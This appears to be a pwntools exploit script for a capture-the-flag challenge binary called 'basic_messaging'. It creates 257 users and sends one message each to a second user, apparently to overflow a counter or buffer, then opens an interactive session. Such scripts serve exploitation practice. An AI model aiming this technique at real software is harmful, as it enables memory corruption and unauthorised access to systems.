#!/usr/bin/env python
from pwn import *

MSG_MAX_LEN = 0x20
USERNAME_MAX_LEN= 0x10

def create_user(p, username) :
    p.recvuntil("1) Create User")
    p.recvuntil(":")
    p.sendline(str(1))
    p.recvuntil("username:")
    p.sendline(username)

def login_as_user(p, username) :
    p.recvuntil("1) Create User")
    p.recvuntil(":")
    p.sendline(str(2))
    p.recvuntil("username:")
    p.sendline(username)

def logout(p) :
    p.recvuntil("5) Logout")
    p.recvuntil(":")
    p.sendline(str(5))

def send_msg_to_user(p, to, msg) :
    p.recvuntil("1) Send Message")
    p.recvuntil(":")
    p.sendline(str(1))
    p.recvuntil("To:")
    p.sendline(to)
    p.recvuntil("Message:")
    p.sendline(msg)

def exit_while_logged_in(p) :
    p.recvuntil("6) Exit")
    p.recvuntil(":")
    p.sendline(str(6))


first_user = "userone"
second_user= "usertwo"

user_list = ["user" + str(i).rjust(3, "0") for i in range(0, 257)]


p = process("./basic_messaging")

## create all users
create_user(p, second_user)
for i in range(0, 257) :
    create_user(p, user_list[i])



## login as user* and send one message
for i in range(0, 257) :
    login_as_user(p, user_list[i])
    msg_len = randint(1, MSG_MAX_LEN - 2)
    message = "q" * msg_len
    send_msg_to_user(p, second_user, message)
    logout(p)

login_as_user(p, second_user)
p.interactive()
